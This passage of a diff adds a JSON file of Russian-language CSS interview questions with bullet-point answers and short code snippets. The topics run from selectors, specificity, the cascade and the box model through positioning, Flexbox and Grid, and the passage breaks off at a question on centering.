@@ -1,0 +1,1489 @@
+{
+  "section": {
+    "id": "css",
+    "name": "CSS",
+    "slug": "css"
+  },
+  "questions": [
+    {
+      "id": "css-what-is-css",
+      "slug": "what-is-css",
+      "question": "Что такое CSS и как он подключается к HTML?",
+      "answer": "- CSS (Cascading Style Sheets) — язык стилей, описывающий визуальное представление HTML-документа\n- Способы подключения:\n  1. Внешний: `<link rel=\"stylesheet\" href=\"style.css\">`\n  2. Внутренний: `<style>` в `<head>`\n  3. Инлайн: `style=\"...\"` на элементе\n  4. `@import url('style.css')` внутри CSS",
+      "difficulty": "interview",
+      "tags": ["Основы CSS"]
+    },
+    {
+      "id": "css-external-internal-inline",
+      "slug": "external-internal-inline",
+      "question": "Разница между внешними, внутренними и инлайн стилями?",
+      "answer": "- Внешние (`<link>`): отдельный файл, кешируется браузером, лучшая поддерживаемость, рекомендуемый подход\n- Внутренние (`<style>`): в `<head>`, используется для Critical CSS или уникальных стилей страницы\n- Инлайн (`style=\"\"`): максимальная специфичность (кроме `!important`), нет кеширования, плохо для поддержки\n- Приоритет: инлайн > внутренние = внешние (зависит от порядка)",
+      "difficulty": "interview",
+      "tags": ["Основы CSS"]
+    },
+    {
+      "id": "css-custom-properties",
+      "slug": "custom-properties",
+      "question": "Что такое CSS-переменные (custom properties)?",
+      "answer": "- Пользовательские свойства с префиксом `--`, используемые через `var()`\n- Наследуются по DOM-дереву, можно переопределять в дочерних элементах\n- В отличие от переменных препроцессоров (Sass), работают в runtime и реагируют на изменения\n```css\n:root {\n  --color-primary: #3b82f6;\n  --spacing: 1rem;\n}\n.button {\n  background: var(--color-primary);\n  padding: var(--spacing, 0.5rem); /* 0.5rem — fallback */\n}\n```",
+      "difficulty": "interview",
+      "tags": ["Основы CSS"]
+    },
+    {
+      "id": "css-reset-normalize",
+      "slug": "reset-normalize",
+      "question": "Как работает CSS Reset и Normalize?",
+      "answer": "- CSS Reset (Eric Meyer) — сбрасывает все стили браузера в ноль (margin, padding, font-size)\n- Normalize.css — сохраняет полезные дефолты, исправляет кроссбраузерные несоответствия\n- Modern CSS Reset — минимальный сброс с `box-sizing: border-box` и удалением margin у body\n```css\n*, *::before, *::after { box-sizing: border-box; }\nbody { margin: 0; }\n```",
+      "difficulty": "interview",
+      "tags": ["Основы CSS"]
+    },
+    {
+      "id": "css-attribute-selectors",
+      "slug": "attribute-selectors",
+      "question": "Что такое селекторы атрибутов?",
+      "answer": "- Позволяют выбирать элементы по наличию или значению атрибутов\n- `[attr]` — есть атрибут\n- `[attr=val]` — точное значение\n- `[attr~=val]` — слово в списке через пробел\n- `[attr|=val]` — значение или значение с `-` (lang)\n- `[attr^=val]` — начинается с\n- `[attr$=val]` — заканчивается на\n- `[attr*=val]` — содержит подстроку\n- `[attr=val i]` — case-insensitive flag",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-descendant-child-sibling",
+      "slug": "descendant-child-sibling",
+      "question": "Как работают селекторы потомков, дочерних элементов и соседних элементов?",
+      "answer": "- `A B` — потомок (любой уровень вложенности)\n- `A > B` — прямой дочерний элемент\n- `A + B` — смежный сосед (сразу после A)\n- `A ~ B` — общий сосед (любой после A на том же уровне)",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-not-selector",
+      "slug": "not-selector",
+      "question": "Что такое селектор `:not()`?",
+      "answer": "- Псевдокласс отрицания: выбирает элементы, НЕ соответствующие аргументу\n- Специфичность `:not()` равна специфичности его аргумента\n- В Selectors Level 4 принимает список: `:not(.a, .b)`\n```css\nli:not(:last-child) { margin-bottom: 1rem; }\ninput:not([type=\"submit\"]):not([type=\"reset\"]) { border: 1px solid #ccc; }\n```",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-first-last-only-child",
+      "slug": "first-last-only-child",
+      "question": "Как работают селекторы `:first-child`, `:last-child`, `:only-child`?",
+      "answer": "- `:first-child` — элемент, который является первым ребёнком своего родителя\n- `:last-child` — последний ребёнок\n- `:only-child` — единственный ребёнок (эквивалент `:first-child:last-child`)\n- Важно: `:first-child` проверяет позицию среди ВСЕХ детей, не только элементов того же типа",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-nth-child-vs-nth-of-type",
+      "slug": "nth-child-vs-nth-of-type",
+      "question": "Разница между `nth-child()` и `nth-of-type()`?",
+      "answer": "- `:nth-child(An+B)` — считает ВСЕ дочерние элементы, затем проверяет тип\n- `:nth-of-type(An+B)` — считает только элементы того же типа\n- Пример: `p:nth-child(2)` — второй ребёнок, ЕСЛИ он `<p>`. `p:nth-of-type(2)` — второй `<p>` среди siblings\n- Формулы: `2n` — чётные, `2n+1` — нечётные, `3n` — каждый третий, `-n+3` — первые три",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-nth-last-child-nth-last-of-type",
+      "slug": "nth-last-child-nth-last-of-type",
+      "question": "Как работают `:nth-last-child()` и `:nth-last-of-type()`?",
+      "answer": "- Аналогичны `:nth-child()` и `:nth-of-type()`, но отсчёт идёт с конца\n- `:nth-last-child(1)` = `:last-child`\n- Полезно для: `li:nth-last-child(-n+3)` — последние 3 элемента",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-only-of-type-empty",
+      "slug": "only-of-type-empty",
+      "question": "Как работают `:only-of-type()` и `:empty`?",
+      "answer": "- `:only-of-type` — элемент является единственным данного типа среди siblings\n- `:empty` — элемент не имеет дочерних узлов (ни элементов, ни текста, ни пробелов)\n- `:empty` полезен для скрытия пустых контейнеров: `.message:empty { display: none; }`\n- Внимание: пробел или перенос строки делают элемент НЕ empty",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-target-root",
+      "slug": "target-root",
+      "question": "Как работают `:target` и `:root` селекторы?",
+      "answer": "- `:target` — элемент, чей `id` совпадает с фрагментом URL (`#section1`)\n- `:root` — корневой элемент документа (`<html>` для HTML)\n- `:root` имеет бо́льшую специфичность чем `html` (псевдокласс vs тип)\n- `:target` используется для CSS-only табов, аккордеонов, модалок",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-is-where-has",
+      "slug": "is-where-has",
+      "question": "Как работают современные селекторы `:is()`, `:where()`, `:has()`?",
+      "answer": "- `:is()` — принимает список селекторов, специфичность = максимальная из списка\n- `:where()` — как `:is()`, но специфичность ВСЕГДА 0\n- `:has()` — \"parent selector\", выбирает элемент, содержащий определённого потомка\n```css\n:is(h1, h2, h3):hover { color: blue; } /* специфичность (0,1,1) */\n:where(h1, h2, h3):hover { color: blue; } /* специфичность (0,1,0) */\narticle:has(img) { display: grid; } /* article, в котором есть img */\n```",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-not-multiple-selectors",
+      "slug": "not-multiple-selectors",
+      "question": "Как работает `:not()` с множественными селекторами?",
+      "answer": "- Level 4: `:not(.a, .b)` — НЕ .a И НЕ .b (forgiving selector list)\n- Level 3 fallback: `:not(.a):not(.b)` — цепочка\n- Специфичность: максимальная из аргументов",
+      "difficulty": "interview",
+      "tags": ["Селекторы"]
+    },
+    {
+      "id": "css-cascade",
+      "slug": "cascade",
+      "question": "Что такое каскадность в CSS?",
+      "answer": "- Алгоритм определения, какое значение свойства применяется к элементу при конфликте\n- Порядок разрешения: Origin & Importance → Cascade Layers → Specificity → Order of Appearance\n- Origins: User-Agent (браузер) < User < Author (разработчик)\n- `!important` переворачивает порядок origins",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-specificity",
+      "slug": "specificity",
+      "question": "Что такое специфичность и как она работает?",
+      "answer": "- Вес селектора, определяющий приоритет при конфликте правил одного origin\n- Формат: (ID, CLASS, TYPE)\n- ID: `#id` — вес (1,0,0)\n- CLASS: `.class`, `[attr]`, `:pseudo-class` — вес (0,1,0)\n- TYPE: `element`, `::pseudo-element` — вес (0,0,1)\n- `*`, комбинаторы (>, +, ~, space) — вес (0,0,0)",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-selector-weights",
+      "slug": "selector-weights",
+      "question": "Какой вес у селекторов: `!important`, инлайн-стили, `#id`, `.class`, тег, универсальный `*`?",
+      "answer": "- `!important` — переопределяет всё (отдельный слой каскада)\n- Инлайн-стили — (1,0,0,0) — выше любого селектора в stylesheet\n- `#id` — (0,1,0,0)\n- `.class`, `[attr]`, `:pseudo-class` — (0,0,1,0)\n- `element`, `::pseudo-element` — (0,0,0,1)\n- `*` — (0,0,0,0)",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-specificity-calculation",
+      "slug": "specificity-calculation",
+      "question": "Как подсчитывается специфичность селекторов?",
+      "answer": "- Считаем количество ID, CLASS, TYPE компонентов\n- `#nav .item a:hover` → 1 ID + 1 class + 1 pseudo-class + 1 type = (1,2,1)\n- `div.container > ul li.active` → 0 ID + 2 class + 3 type = (0,2,3)\n- Сравнение — слева направо: (1,0,0) > (0,15,15)",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-attribute-selector-specificity",
+      "slug": "attribute-selector-specificity",
+      "question": "Как работает специфичность селекторов атрибутов?",
+      "answer": "- Селекторы атрибутов `[type=\"text\"]` имеют ту же специфичность, что и классы: (0,1,0)\n- `input[type=\"text\"]` = (0,1,1)\n- `[id=\"main\"]` = (0,1,0), а `#main` = (1,0,0) — разная специфичность при одном результате",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-pseudo-specificity",
+      "slug": "pseudo-specificity",
+      "question": "Как работает специфичность псевдоклассов и псевдоэлементов?",
+      "answer": "- Псевдоклассы (`:hover`, `:focus`, `:nth-child()`) — как класс: (0,1,0)\n- Псевдоэлементы (`::before`, `::after`, `::first-line`) — как тип: (0,0,1)\n- `:is()`, `:not()`, `:has()` — специфичность самого специфичного аргумента\n- `:where()` — ВСЕГДА (0,0,0), используется для обнуления специфичности",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-inheritance",
+      "slug": "inheritance",
+      "question": "Что такое наследование в CSS?",
+      "answer": "- Механизм, при котором дочерние элементы получают значения свойств от родителей\n- Наследуются: `color`, `font-*`, `line-height`, `text-align`, `visibility`, `cursor`, `list-style`\n- НЕ наследуются: `margin`, `padding`, `border`, `background`, `display`, `width`, `height`, `position`\n- `inherit` — принудительно наследовать, `initial` — сбросить к спецификации",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-initial-inherit-unset-revert",
+      "slug": "initial-inherit-unset-revert",
+      "question": "Как работают `initial`, `inherit`, `unset`, `revert`?",
+      "answer": "- `initial` — начальное значение из спецификации CSS (не браузерное)\n- `inherit` — наследовать значение от родителя\n- `unset` — `inherit` для наследуемых свойств, `initial` для остальных\n- `revert` — откатить к стилям предыдущего origin (user-agent)\n- `revert-layer` — откатить к предыдущему cascade layer",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-all-property",
+      "slug": "all-property",
+      "question": "Что такое `all` свойство?",
+      "answer": "- Shorthand для сброса ВСЕХ свойств элемента (кроме `direction` и `unicode-bidi`)\n- `all: unset` — сбросить все стили элемента\n- `all: revert` — откатить к браузерным стилям\n- Полезно для изоляции компонентов от внешних стилей",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-layer-cascade",
+      "slug": "layer-cascade",
+      "question": "Как работает `@layer` для управления каскадностью?",
+      "answer": "- Cascade Layers позволяют явно управлять порядком приоритета группы стилей\n- Стили вне layers имеют приоритет над всеми layers\n- `!important` внутри layers — приоритет ИНВЕРТИРУЕТСЯ (первый layer > последний)\n```css\n@layer reset, base, components, utilities;\n@layer reset { * { margin: 0; } }\n@layer components { .btn { padding: 1rem; } }\n```",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-layer-priority",
+      "slug": "layer-priority",
+      "question": "Как работает приоритет слоев в CSS?",
+      "answer": "- Порядок объявления определяет приоритет: последний layer > первый\n- Unlayered styles > все layers\n- Для `!important`: первый layer > последний layer > unlayered (инверсия)\n```\nNormal:    reset < base < components < utilities < unlayered\nImportant: unlayered < utilities < components < base < reset\n```",
+      "difficulty": "interview",
+      "tags": ["Каскадность и специфичность"]
+    },
+    {
+      "id": "css-block-inline-content",
+      "slug": "block-inline-content",
+      "question": "Разница между блочным и строчным контентом?",
+      "answer": "- Блочные элементы: занимают всю ширину, начинаются с новой строки, имеют width/height, margin/padding со всех сторон\n- Строчные: занимают только нужную ширину, не начинают новую строку, вертикальные margin/padding не влияют на поток\n- `inline-block` — гибрид: в потоке как inline, но принимает width/height и вертикальные margin/padding",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-content-box-padding-box",
+      "slug": "content-box-padding-box",
+      "question": "Что такое `content-box` и `padding-box`?",
+      "answer": "- `content-box` — width/height задают размер ТОЛЬКО контента (без padding и border)\n- `padding-box` — width/height включают padding (не поддерживается в box-sizing!)\n- В Box Model: общая ширина = width + padding-left + padding-right + border-left + border-right (при content-box)",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-box-sizing",
+      "slug": "box-sizing",
+      "question": "Как работает `box-sizing`?",
+      "answer": "- `content-box` (default): width = только контент\n- `border-box`: width = контент + padding + border\n- Рекомендуемый reset: `*, *::before, *::after { box-sizing: border-box; }`\n- border-box упрощает расчёты: `width: 100%` реально занимает 100%, даже с padding",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-border-box",
+      "slug": "border-box",
+      "question": "Что такое `border-box`?",
+      "answer": "- Значение `box-sizing`, при котором `width` и `height` включают padding и border\n- `width: 200px; padding: 20px; border: 2px solid;` → элемент занимает ровно 200px\n- Контент получает: 200 - 20*2 - 2*2 = 156px\n- Используется повсеместно как дефолт через CSS Reset",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-margin-collapse",
+      "slug": "margin-collapse",
+      "question": "Что такое margin collapse?",
+      "answer": "- Схлопывание вертикальных margin между блочными элементами\n- Два margin по 20px дадут 20px, не 40px (берётся максимальный)\n- Происходит: между siblings, между parent и first/last child (если нет border/padding/BFC)\n- НЕ происходит: для flex/grid items, float, absolute/fixed, inline-block, элементов с overflow ≠ visible\n- Негативные margin: если один -10px, другой 20px → итого 10px (сумма)",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-box-decoration-break",
+      "slug": "box-decoration-break",
+      "question": "Как работает `box-decoration-break`?",
+      "answer": "- Определяет отображение border/padding/background при разрыве элемента (multi-line inline, column break, page break)\n- `slice` (default) — элемент визуально \"разрезается\", фон/border продолжаются\n- `clone` — каждый фрагмент получает полный набор border/padding/background\n- Полезно для inline элементов с фоном, разбитых на несколько строк",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-outline-vs-border",
+      "slug": "outline-vs-border",
+      "question": "Разница между `outline` и `border`?",
+      "answer": "- `border` — часть box model, влияет на размер элемента и layout\n- `outline` — НЕ часть box model, рисуется поверх, не влияет на layout\n- `outline` не может быть скруглённым (в старых браузерах), сейчас поддерживает `border-radius`\n- `outline-offset` — отступ outline от border\n- Важно для accessibility: не удаляйте `outline` на `:focus` без альтернативы",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-box-shadow",
+      "slug": "box-shadow",
+      "question": "Как работает `box-shadow` концептуально?",
+      "answer": "- Синтаксис: `box-shadow: offsetX offsetY blur spread color inset`\n- `blur` — размытие (Gaussian blur), `spread` — расширение/сжатие тени\n- Multiple shadows: через запятую, первая — сверху\n- `inset` — внутренняя тень\n- Не влияет на layout, рисуется под/над контентом\n```css\nbox-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);\n```",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-position-types",
+      "slug": "position-types",
+      "question": "Разница между `static`, `relative`, `absolute`, `fixed`, `sticky`?",
+      "answer": "- `static` — по умолчанию, элемент в нормальном потоке, top/left/z-index игнорируются\n- `relative` — в потоке, но смещён относительно своей нормальной позиции, создаёт containing block\n- `absolute` — вырван из потока, позиционируется относительно ближайшего позиционированного предка\n- `fixed` — вырван из потока, относительно viewport (или предка с transform/filter/will-change)\n- `sticky` — в потоке до порога, затем \"прилипает\" при скролле",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-absolute-positioning",
+      "slug": "absolute-positioning",
+      "question": "Относительно чего позиционируется `absolute`?",
+      "answer": "- Относительно ближайшего предка с `position` != `static` (relative, absolute, fixed, sticky)\n- Если такого нет — относительно Initial Containing Block (обычно viewport)\n- Также: предок с `transform`, `filter`, `perspective`, `will-change`, `contain: paint` создаёт containing block",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-position-sticky",
+      "slug": "position-sticky",
+      "question": "Что такое `position: sticky` и как он работает?",
+      "answer": "- Гибрид relative и fixed: элемент в потоке, но \"прилипает\" при скролле\n- Требует хотя бы одно из: `top`, `bottom`, `left`, `right`\n- \"Прилипает\" внутри своего containing block (parent с `overflow: hidden` ломает sticky!)\n- Перестаёт \"прилипать\", когда containing block уходит из viewport",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-z-index",
+      "slug": "z-index",
+      "question": "Как работает `z-index`?",
+      "answer": "- Управляет порядком наложения элементов по оси Z\n- Работает ТОЛЬКО на позиционированных элементах (не static) и flex/grid items\n- Элементы сравниваются в пределах одного stacking context\n- Значения: целые числа (положительные, отрицательные, 0), `auto`",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-z-index-position",
+      "slug": "z-index-position",
+      "question": "Как работает `z-index` с `position`?",
+      "answer": "- `z-index` на `static` — игнорируется\n- `z-index` на `relative/absolute/fixed/sticky` — создаёт stacking context (если ≠ auto)\n- Без z-index порядок: background → negative z-index → block-level → float → inline → z-index: 0 → positive z-index",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-float-clear",
+      "slug": "float-clear",
+      "question": "Как работает `float` и `clear` (исторически важно)?",
+      "answer": "- `float: left/right` — элемент вырывается из потока, текст обтекает его\n- `clear: left/right/both` — элемент не допускает float-элементы с указанной стороны\n- Clearfix: родитель \"схлопывается\" без float children → решение: `overflow: auto` или `::after { clear: both; }`\n- Сейчас заменён Flexbox и Grid для layout задач",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-vertical-align",
+      "slug": "vertical-align",
+      "question": "Как работает `vertical-align`?",
+      "answer": "- Выравнивает inline/inline-block элемент относительно line box\n- Значения: `baseline` (default), `top`, `middle`, `bottom`, `text-top`, `text-bottom`, числа/проценты\n- Частая проблема: 4px gap под img → решение: `vertical-align: middle/block` или `display: block`\n- НЕ работает для block-level элементов (используйте flexbox)",
+      "difficulty": "interview",
+      "tags": ["Позиционирование"]
+    },
+    {
+      "id": "css-display-values",
+      "slug": "display-values",
+      "question": "Какие значения может принимать `display`?",
+      "answer": "- Внешний тип: `block`, `inline`, `inline-block`\n- Внутренний тип: `flex`, `inline-flex`, `grid`, `inline-grid`, `table`, `inline-table`\n- Специальные: `none` (убирает из layout и accessibility tree), `contents` (убирает box, дети \"поднимаются\"), `flow-root` (создаёт BFC)\n- Двухкомпонентный синтаксис: `display: block flex` = внешний block, внутренний flex",
+      "difficulty": "interview",
+      "tags": ["Display", "Box Model"]
+    },
+    {
+      "id": "css-inline-inline-block-block",
+      "slug": "inline-inline-block-block",
+      "question": "Разница между `inline`, `inline-block`, `block`?",
+      "answer": "- `inline`: в строке, игнорирует width/height, вертикальные margin не влияют\n- `inline-block`: в строке, но принимает width/height и все margin/padding\n- `block`: на новой строке, занимает всю ширину, принимает все свойства box model\n- `inline-block` полезен для: кнопок, навигационных элементов, расположения элементов в строку с размерами",
+      "difficulty": "interview",
+      "tags": ["Display", "Box Model"]
+    },
+    {
+      "id": "css-text-align",
+      "slug": "text-align",
+      "question": "Как работает `text-align`?",
+      "answer": "- Выравнивает inline-content внутри block контейнера: `left`, `right`, `center`, `justify`\n- Наследуется дочерними элементами\n- Работает для: текста, inline, inline-block, inline-flex, inline-grid\n- `text-align: justify` — растягивает строки, `text-align-last` — управляет последней строкой",
+      "difficulty": "interview",
+      "tags": ["Display", "Box Model"]
+    },
+    {
+      "id": "css-flex-container-properties",
+      "slug": "flex-container-properties",
+      "question": "Основные свойства flex-контейнера?",
+      "answer": "- `display: flex` / `inline-flex`\n- `flex-direction`: row | row-reverse | column | column-reverse\n- `flex-wrap`: nowrap | wrap | wrap-reverse\n- `justify-content`: flex-start | center | flex-end | space-between | space-around | space-evenly\n- `align-items`: stretch | flex-start | flex-end | center | baseline\n- `align-content`: (для multi-line) stretch | flex-start | flex-end | center | space-between | space-around\n- `gap`: row-gap column-gap",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-flex-item-properties",
+      "slug": "flex-item-properties",
+      "question": "Основные свойства flex-элементов?",
+      "answer": "- `flex-grow` — коэффициент роста (распределение свободного пространства)\n- `flex-shrink` — коэффициент сжатия\n- `flex-basis` — базовый размер до grow/shrink\n- `order` — визуальный порядок\n- `align-self` — переопределяет align-items для конкретного элемента",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-flex-grow-shrink-basis",
+      "slug": "flex-grow-shrink-basis",
+      "question": "Что такое `flex-grow`, `flex-shrink`, `flex-basis`?",
+      "answer": "- `flex-grow` (default 0): сколько свободного пространства элемент забирает. grow=2 получает вдвое больше чем grow=1\n- `flex-shrink` (default 1): как элемент сжимается при нехватке места. Формула учитывает `flex-basis * flex-shrink`\n- `flex-basis` (default auto): начальный размер до распределения. `auto` = берёт width/height, `0` = игнорирует содержимое\n- Shorthand: `flex: grow shrink basis`",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-align-items-vs-align-self",
+      "slug": "align-items-vs-align-self",
+      "question": "Как работает `align-items` vs `align-self`?",
+      "answer": "- `align-items` — на контейнере, задаёт выравнивание по cross axis для ВСЕХ items\n- `align-self` — на конкретном item, переопределяет `align-items` для этого элемента\n- Значения: `stretch` (default), `flex-start`, `flex-end`, `center`, `baseline`\n- `baseline` выравнивает по базовой линии текста — полезно для элементов разной высоты",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-flex-wrap-direction",
+      "slug": "flex-wrap-direction",
+      "question": "Как работают `flex-wrap` и `flex-direction`?",
+      "answer": "- `flex-direction` определяет main axis: `row` (→), `row-reverse` (←), `column` (↓), `column-reverse` (↑)\n- `flex-wrap: nowrap` (default) — все items в одну строку, могут сжиматься\n- `flex-wrap: wrap` — items переносятся на новую строку при нехватке места\n- `flex-flow` — shorthand: `flex-flow: row wrap`",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-justify-content-align-content",
+      "slug": "justify-content-align-content",
+      "question": "Как работают `justify-content` и `align-content`?",
+      "answer": "- `justify-content` — распределение по MAIN axis (одна строка)\n- `align-content` — распределение СТРОК по cross axis (только при wrap!)\n- `space-between` — первый/последний прижаты к краям, остальные равномерно\n- `space-around` — равные отступы вокруг (двойной отступ между)\n- `space-evenly` — абсолютно равные промежутки",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-order-property",
+      "slug": "order-property",
+      "question": "Как работает `order` свойство?",
+      "answer": "- Изменяет визуальный порядок flex/grid item (default 0)\n- Элементы с меньшим order отображаются первыми\n- Не влияет на DOM-порядок, tab-навигацию, screen readers — проблема accessibility!\n- Используйте осторожно: визуальный и DOM порядок должны совпадать",
+      "difficulty": "interview",
+      "tags": ["Flexbox"]
+    },
+    {
+      "id": "css-flexbox-vs-grid",
+      "slug": "flexbox-vs-grid",
+      "question": "Когда использовать Flexbox vs Grid?",
+      "answer": "- Flexbox — одномерная раскладка (строка ИЛИ колонка), content-first\n- Grid — двумерная раскладка (строки И колонки), layout-first\n- Flexbox: навигация, карточки в строку, распределение пространства, выравнивание\n- Grid: макет страницы, сложные сетки, overlapping, named areas\n- Можно комбинировать: Grid для layout, Flexbox для компонентов внутри",
+      "difficulty": "interview",
+      "tags": ["Flexbox", "Grid"]
+    },
+    {
+      "id": "css-grid-layout-intro",
+      "slug": "grid-layout-intro",
+      "question": "Что такое grid layout и чем он отличается от flexbox?",
+      "answer": "- CSS Grid — двумерная система раскладки, управляющая строками и колонками одновременно\n- Grid: layout-first (определяете сетку, размещаете элементы), Flexbox: content-first (контент определяет размер)\n- Grid позволяет overlap элементов, named areas, subgrid — чего нет в Flexbox",
+      "difficulty": "interview",
+      "tags": ["Grid", "Flexbox"]
+    },
+    {
+      "id": "css-grid-container-properties",
+      "slug": "grid-container-properties",
+      "question": "Основные свойства grid-контейнера?",
+      "answer": "- `display: grid` / `inline-grid`\n- `grid-template-columns`, `grid-template-rows` — определение треков\n- `grid-template-areas` — именованные области\n- `gap` (row-gap, column-gap)\n- `justify-items`, `align-items` — выравнивание items внутри ячеек\n- `justify-content`, `align-content` — выравнивание сетки внутри контейнера",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-template-columns-rows",
+      "slug": "grid-template-columns-rows",
+      "question": "Как работают `grid-template-columns` и `grid-template-rows`?",
+      "answer": "- Определяют размеры и количество треков (колонок/строк)\n- Значения: px, %, fr, auto, min-content, max-content, minmax(), fit-content()\n- `fr` — доля свободного пространства\n- `repeat()` — повторение: `repeat(3, 1fr)`, `repeat(auto-fill, 200px)`, `repeat(auto-fit, minmax(200px, 1fr))`\n```css\ngrid-template-columns: 200px 1fr 2fr;\ngrid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr));\n```",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-area-template-areas",
+      "slug": "grid-area-template-areas",
+      "question": "Что такое `grid-area` и `grid-template-areas`?",
+      "answer": "- `grid-template-areas` — визуальное определение layout через ASCII-art\n- `grid-area` — привязка элемента к именованной области\n- `.` — пустая ячейка, каждая строка в кавычках\n```css\ngrid-template-areas:\n  \"header header\"\n  \"sidebar main\"\n  \"footer footer\";\n.header { grid-area: header; }\n```",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-justify-items-vs-content",
+      "slug": "grid-justify-items-vs-content",
+      "question": "Разница между `justify-items` и `justify-content` в Grid?",
+      "answer": "- `justify-items` — выравнивание СОДЕРЖИМОГО ячеек внутри их track (по inline axis)\n- `justify-content` — выравнивание ВСЕЙ СЕТКИ внутри контейнера (если сетка меньше контейнера)\n- Аналогично для `align-items` vs `align-content` (по block axis)",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-subgrid",
+      "slug": "grid-subgrid",
+      "question": "Что такое CSS Grid Subgrid?",
+      "answer": "- Позволяет вложенному grid использовать треки родительского grid\n- `grid-template-columns: subgrid` — дочерний grid наследует колонки parent\n- Решает проблему выравнивания вложенных элементов с основной сеткой\n- Поддержка: Firefox (давно), Chrome/Safari (с 2023)\n```css\n.child { display: grid; grid-template-columns: subgrid; grid-column: span 3; }\n```",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-auto-flow",
+      "slug": "grid-auto-flow",
+      "question": "Как работает `grid-auto-flow`?",
+      "answer": "- Управляет автоматическим размещением items в неявной сетке\n- `row` (default) — заполнение по строкам\n- `column` — заполнение по колонкам\n- `dense` — плотная упаковка (заполняет пропуски), может нарушить DOM порядок",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-auto-rows-columns",
+      "slug": "grid-auto-rows-columns",
+      "question": "Как работают `grid-auto-rows` и `grid-auto-columns`?",
+      "answer": "- Задают размер неявных (auto-generated) треков\n- Применяются когда items выходят за пределы явной сетки\n```css\ngrid-template-rows: 100px 100px; /* 2 явных ряда */\ngrid-auto-rows: 50px; /* остальные ряды по 50px */\ngrid-auto-rows: minmax(100px, auto); /* минимум 100px, растут по контенту */\n```",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-grid-gap-vs-gap",
+      "slug": "grid-gap-vs-gap",
+      "question": "Разница между `grid-gap` и `gap`?",
+      "answer": "- `grid-gap` — старое название (deprecated, но работает)\n- `gap` — стандартное свойство, работает в Grid, Flexbox, Multi-column\n- `gap: 1rem 2rem` — row-gap column-gap\n- `gap: 1rem` — одинаковый gap по обоим осям",
+      "difficulty": "interview",
+      "tags": ["Grid"]
+    },
+    {
+      "id": "css-centering",
+      "slug": "centering",
+      "question": "Как выровнять элемент по центру? все способы",
